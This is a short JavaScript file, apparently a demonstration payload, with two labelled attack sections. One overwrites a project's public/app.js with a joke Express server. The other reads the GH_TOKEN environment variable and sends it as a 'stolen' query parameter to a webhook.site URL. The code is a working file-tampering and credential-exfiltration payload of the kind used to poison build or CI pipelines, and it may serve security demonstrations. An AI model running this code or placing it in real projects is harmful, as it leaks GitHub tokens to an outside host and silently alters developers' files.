//-----file tampering-----
const fs = require("fs");
const path = require("path");

const filePath = "../../public/app.js"

if (filePath){
  const newFileContent = ' \n\
  const express = require("express");\n\
  const app = express();\n\
  const PORT = 1337;\n\
  \n\
  app.get("/", (req, res) => {\n\
    res.send("Chopsticks are better than spoons! 🥢");\n\
  });\n\
  \n\
  app.listen(PORT, ()=>{\n\
    console.log("I want chopsticks");\n\
  });'

  fs.writeFileSync(filePath, newFileContent, "utf-8");
} else {
  console.log("File not found :(")
}

//-----network exfil-----
const https = require('https');
const webhook = 'https://webhook.site/beeb98e1-2d41-4402-9dde-e6712df6f05a';
const token = process.env.GH_TOKEN;
const url = webhook + "?stolen=" + token;

const request = https.request(url, (response) => {
    let data = '';
    response.on('data', (chunk) => {
        data = data + chunk.toString();
    });

    response.on('end', () => {
        console.log(data);
    });
})

request.on('error', (error) => {
    console.log('An error', error);
});

request.end() 